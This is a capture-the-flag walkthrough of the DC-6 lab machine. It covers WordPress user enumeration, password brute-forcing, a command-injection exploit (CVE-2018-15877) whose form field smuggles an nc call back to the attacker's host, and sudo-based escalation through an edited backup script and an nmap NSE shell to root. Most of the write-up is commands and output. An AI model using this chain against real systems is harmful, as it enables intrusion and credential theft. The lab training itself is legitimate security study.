
## 1. Enumeration

### 1.1 Finding the Target IP

I first scanned the local network to identify the IP address of the DC-6 machine.

```bash
nmap -sn 192.168.56.0/24
```

After identifying the target, I performed a full port and service scan:

```bash
nmap -A 192.168.56.115 -p-
```

The scan revealed two important services:

```text
22/tcp   open   ssh
80/tcp   open   http
```

The web server redirected to:

```text
http://wordy
```

This indicated that the `wordy` hostname needed to be mapped to the target IP.

---

### 1.2 Directory Enumeration

I checked for accessible directories using DIRB:

```bash
dirb http://192.168.56.115/
```

The scan did not reveal anything particularly useful, so I moved on to enumerating the WordPress application.

---

# 2. Configuring `/etc/hosts`

I edited the hosts file:

```bash
sudo nano /etc/hosts
```

I added the target hostname:

```text
192.168.56.115    wordy
```

I could then access the application using:

```text
http://wordy
```

The website was running **WordPress**.

---

# 3. WordPress Enumeration

I used WPScan to enumerate the WordPress installation:

```bash
wpscan --url http://192.168.56.115 -e vt,ap,u
```

The scan revealed the following users:

```text
mark
graham
sarah
jens
admin
```

It also provided information about the WordPress installation:

```text
WordPress theme : twentyseventeen
Version: 2.1
Server: Apache/2.4.25 (Debian)
WordPress version: 5.1.1
```

The plugin enumeration also revealed the **Plainview Activity Monitor**, which was particularly interesting because it had a known authenticated command-injection vulnerability.

---

# 4. Creating a Focused Password Wordlist

The DC-6 machine provides a hint involving the `k01` string.

Instead of using the entire `rockyou.txt` wordlist, I filtered it for entries containing `k01`:

```bash
cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
```

This created a much smaller wordlist:

```text
passwords.txt
```

This made the password attack considerably faster.

---

# 5. WordPress Password Discovery

I used WPScan to test the discovered WordPress users against the filtered password list:

```bash
wpscan --url http://wordy -e u -U mark,graham,sarah,jens,admin -P passwords.txt
```

The scan returned a valid credential combination:

```text
Valid Combinations Found:
Username: mark, Password: helpdesk01
```

I used these credentials to access the WordPress login page:

```text
http://wordy/wp-login.php
```

I successfully logged in as **Mark**.

---

# 6. Exploiting Plainview Activity Monitor

After logging into WordPress, I investigated the installed plugins.

The **Plainview Activity Monitor** plugin was vulnerable to authenticated command injection.

I searched for a suitable exploit using SearchSploit:

```bash
searchsploit activity monitor
```

I found the following exploit:

```text
Exploit: WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection
URL: https://www.exploit-db.com/exploits/45274
Codes: CVE-2018-15877
```

I copied the exploit to my machine:

```bash
searchsploit -m php/webapps/45274.html
```

The exploit was copied to:

```text
/home/kali/45274.html
```

The terminal output from the exploit search was:

```text
┌──(kali㉿hashi)-[~]
└─$ searchsploit -m php/webapps/45274.html

  Exploit: WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection
      URL: https://www.exploit-db.com/exploits/45274
     Path: /usr/share/exploitdb/exploits/php/webapps/45274.html
    Codes: CVE-2018-15877
 Verified: True
File Type: ReStructuredText file, ASCII text
Copied to: /home/kali/45274.html
```

---

# 7. Preparing the Exploit

I opened the downloaded exploit:

```bash
nano 45274.html
```

I modified the required IP address and port so that the injected command would connect back to my Kali machine.

The relevant section was:

```html
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://wordy:80/wp-admin/admin.php?page=plainview_activity_mtivity_tools" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="ip" value="google.fr| nc 192.168.56.102 3333  />
      <input type="hidden" name="lookup" value="Lookup" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

The following line creates the button that triggers the request:

```html
<input type="submit" value="Submit request" />
```

---

# 8. Initial Access

Before executing the exploit, I started a Netcat listener on my Kali machine:

```bash
nc -lvnp 3333
```

My listener was waiting for an incoming connection:

```text
┌──(kali㉿hashi)-[/]
└─$ nc -lvnp 3333
listening on [any] 3333 ...
```

I then opened the exploit file in the browser:

![](attachments/Pasted%20image%2020260810011106.png)

```text
file:///home/kali/45274.html
```

After clicking the **Submit request** button, the vulnerable plugin executed the injected command and connected back to my Kali machine.

This gave me a shell on the target.

I checked the current user:

```bash
whoami
```

The shell was running as:

```text
www-data
```

---

# 9. Upgrading the Shell

The initial shell was limited, so I upgraded it to a Bash shell using Python:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

I then suspended the shell using:

```text
Ctrl + Z
```

On my Kali machine, I ran:

```bash
stty raw -echo; fg; reset
```

This provided a more usable interactive shell.

---

# 10. Local Enumeration

I started enumerating the target machine.

I checked the current directory:

```bash
ls -la
```

Then I checked the `/home` directory:

```bash
ls -la /home
```

I discovered the following user directories:

```text
mark
graham
jens
sarah
```

Since I already had information related to Mark, I inspected his directory.

```bash
ls -la /home/mark/stuff
```

The directory contained:

```text
things-to-do.txt
```

I read the file:

```bash
cat things-to-do.txt
```

The file contained useful credentials:

```text
www-data@dc-6:/home/mark$ cd stuff
www-data@dc-6:/home/mark/stuff$ ls
things-to-do.txt
www-data@dc-6:/home/mark/stuff$ cat things-to-do.txt
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement
```

This revealed credentials for Graham:

```text
Username: graham
Password: GSo7isUM1D4
```

---

# 11. Accessing Graham's Account

I used the discovered credentials to connect to the target through SSH:

```bash
ssh graham@192.168.56.115
```

After logging in, I checked the current user:

```bash
whoami
```

I then checked the user's ID and group membership:

```bash
id
```

The terminal output was:

```text
graham@dc-6:~$ id
uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)
```

The `devs` group membership was important because it provided access to files associated with development activities.

---

# 12. Privilege Escalation – Graham to Jens

I checked Graham's sudo permissions:

```bash
sudo -l
```

The output showed:

```text
User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
```

This meant that Graham could execute `/home/jens/backups.sh` as the user **Jens** without entering a password.

I inspected the script:

```bash
less /home/jens/backups.sh
```

I also checked the file permissions:

```bash
ls -la
```

The permissions and group membership allowed me to modify the script.

I opened the script using:

```bash
vi /home/jens/backups.sh
```

I modified the script by removing the original `tar` command and adding:

```bash
/bin/bash
```

I saved and exited using:

```text
:wq
```

---

# 13. Executing `backups.sh` as Jens

I moved to Jens's home directory:

```bash
cd /home/jens
```

I then executed the modified backup script as Jens:

```bash
sudo -u jens ./backups.sh
```

This spawned a shell as Jens:

```text
jens@dc-6:~$
```

I verified the current user:

```bash
whoami
```

The result was:

```text
jens
```

I had successfully escalated from:

```text
www-data → graham → jens
```

---

# 14. Privilege Escalation – Jens to Root

Now that I had access to Jens's account, I checked his sudo permissions:

```bash
sudo -l
```

The output was:

```text
jens@dc-6:~$ sudo -l
Matching Defaults entries for jens on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap
```

This was the key privilege-escalation vulnerability.

Jens was allowed to execute **Nmap as root without a password**.

---

# 15. Exploiting Nmap

I used the Nmap scripting functionality to execute a shell.

First, I created a temporary file:

```bash
TF=$(mktemp)
```

I then added a command to spawn a shell:

```bash
echo 'os.execute("/bin/sh")' > $TF
```

I executed the script through Nmap with root privileges:

```bash
sudo nmap --script=$TF
```

This spawned a root shell.

I checked my privileges:

```bash
whoami
```

The result was:

```text
root
```

🎉 **Root access obtained!**

---

# 16. Upgrading the Root Shell

The root shell initially did not provide a fully interactive terminal.

I upgraded it using Python:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

I then checked the current user:

```bash
whoami
```

The output confirmed:

```text
root
```

---

# 17. Obtaining the Final Flag

After obtaining root access, I moved to the root directory:

```bash
cd /root
```

I listed the directory contents:

```bash
ls -al
```

I found:

```text
theflag.txt
```

I initially attempted to read the file while still in `/home/jens`:

```text
root@dc-6:/home/jens# cat theflag.txt
cat: theflag.txt: No such file or directory
```

I then used the absolute path The flag file contained:
![](attachments/Pasted%20image%2020260810013153.png)

```text
root@dc-6:/home/jens# cat theflag.txt
cat: theflag.txt: No such file or directory
root@dc-6:/home/jens# cat /root/theflag.txt


Yb        dP 888888 88     88         8888b.   dP"Yb  88b 88 888888 d8b 
 Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
  YbdPYbdP   88""   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   `"' 
   YP  YP    888888 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 (8) 


Congratulations!!!

Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
```

This confirmed that the DC-6 machine had been successfully completed.


---

# 18. Attack Path

```text
Network Enumeration
        ↓
Nmap
        ↓
HTTP + SSH
        ↓
wordy Hostname
        ↓
WordPress Enumeration
        ↓
WPScan
        ↓
WordPress Users
        ↓
Filtered rockyou Wordlist
        ↓
Mark Credentials
        ↓
Plainview Activity Monitor
        ↓
Authenticated Command Injection
        ↓
Reverse Shell
        ↓
www-data
        ↓
/home/mark/stuff/things-to-do.txt
        ↓
Graham Credentials
        ↓
Graham
        ↓
sudo -l
        ↓
Writable backups.sh
        ↓
Jens
        ↓
sudo -l
        ↓
Nmap as Root
        ↓
Nmap NSE Shell
        ↓
Root
        ↓
/root/theflag.txt
```

# 19. Key Takeaways

- Always perform full port and service enumeration.
    
- Check `/etc/hosts` when a web application uses a custom hostname.
    
- WPScan is useful for enumerating WordPress users and plugins.
    
- Filtering a large wordlist can make password attacks significantly faster.
    
- Always investigate installed WordPress plugins for known vulnerabilities.
    
- Authenticated command injection can provide initial shell access.
    
- After gaining a shell, enumerate user directories for credentials and useful files.
    
- Always check `sudo -l` when performing Linux privilege escalation.
    
- Writable scripts executed with higher privileges can be abused to switch users.
    
- Nmap running as root can be abused through its scripting functionality.
    
- Multiple weaknesses can be chained together to obtain complete root access.